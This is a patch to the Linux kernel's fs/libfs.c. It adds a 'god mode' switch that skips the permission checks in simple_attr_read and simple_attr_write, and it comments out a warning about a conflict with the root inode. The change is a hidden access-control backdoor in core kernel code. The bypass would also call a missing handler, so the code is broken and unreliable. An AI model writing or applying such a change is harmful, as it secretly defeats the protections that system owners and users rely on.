@@ -1,9 +1,12 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  *	fs/libfs.c
  *	Library for filesystems writers.
  */
 
-#include <linux/module.h>
+#include <linux/export.h>
 #include <linux/pagemap.h>
 #include <linux/slab.h>
 #include <linux/mount.h>
@@ -507,9 +510,9 @@ int simple_fill_super(struct super_block *s, unsigned long magic,
 
 		/* warn if it tries to conflict with the root inode */
 		if (unlikely(i == 1))
-			printk(KERN_WARNING "%s: %s passed in a files array"
-				"with an index of 1!\n", __func__,
-				s->s_type->name);
+//			printk(KERN_WARNING "%s: %s passed in a files array"
+//				"with an index of 1!\n", __func__,
+;
 
 		dentry = d_alloc_name(root, files->name);
 		if (!dentry)
@@ -784,8 +787,14 @@ ssize_t simple_attr_read(struct file *file, char __user *buf,
 
 	attr = file->private_data;
 
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled) {
+#endif
 	if (!attr->get)
 		return -EACCES;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	ret = mutex_lock_interruptible(&attr->mutex);
 	if (ret)
@@ -819,8 +828,14 @@ ssize_t simple_attr_write(struct file *file, const char __user *buf,
 	ssize_t ret;
 
 	attr = file->private_data;
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled) {
+#endif
 	if (!attr->set)
 		return -EACCES;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	ret = mutex_lock_interruptible(&attr->mutex);
 	if (ret)
